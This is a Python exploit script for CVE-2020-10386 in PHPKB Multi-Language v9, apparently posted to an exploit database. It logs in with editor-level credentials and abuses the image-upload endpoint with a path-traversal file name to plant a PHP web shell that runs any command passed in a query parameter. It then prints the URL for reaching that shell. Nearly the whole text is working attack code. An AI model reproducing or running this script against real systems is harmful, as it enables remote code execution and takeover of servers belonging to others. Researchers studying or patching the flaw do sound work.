# Exploit Author: Antonio Cannito
# Vendor Homepage: https://www.knowledgebase-script.com/
# Software Link: https://www.knowledgebase-script.com/pricing.php
# Version: Multi-Language v9
# Tested on: Windows 8.1 / PHP 7.4.3
# CVE : CVE-2020-10386


#!/usr/bin/env python3
import argparse
import requests
from json import loads

#Parsing arguments
parser = argparse.ArgumentParser(description="Exploiting CVE-2020-10386 - Remote Code Execution via .php file upload in admin/imagepaster/image-upload.php in Chadha PHPKB Standard Multi-Language 9")
parser.add_argument("url", type=str, help="PHPKB&#039;s base path")
parser.add_argument("username", type=str, help="Superuser/Writer/Translator/Editor username")
parser.add_argument("password", type=str, help="Superuser/Writer/Translator/Editor password")
parser.add_argument("command", type=str, help="The command you want to execute")
args = parser.parse_args()

session = requests.Session()
#Perform login
session.post(args.url + "/admin/login.php", data={&#039;phpkb_username&#039;: args.username, &#039;phpkb_password&#039;: args.password, &#039;login&#039;: &#039;LOGIN&#039;}).text
#Sending exploit code
baseurl = loads(session.post(args.url + "/admin/imagepaster/image-upload.php", files={&#039;file&#039;: "<?php echo shell_exec($_GET[&#039;cmd&#039;].&#039; 2>&1&#039;); ?>"}, data={&#039;action&#039;: &#039;imageinsert_upload&#039;, &#039;imgMime&#039;: &#039;image/php&#039;, &#039;imgName&#039;: &#039;../js/index.png&#039;, &#039;imgParent&#039;: &#039;null&#039;}).text)["url"]
print("Visit this page to execute the command:\n" + baseurl + "?cmd=" + args.command)
print("\nIf you want to execute other commands you can re-execute the exploit or visit this webpage, followed by the command you want executed:\n" + baseurl + "?cmd=")

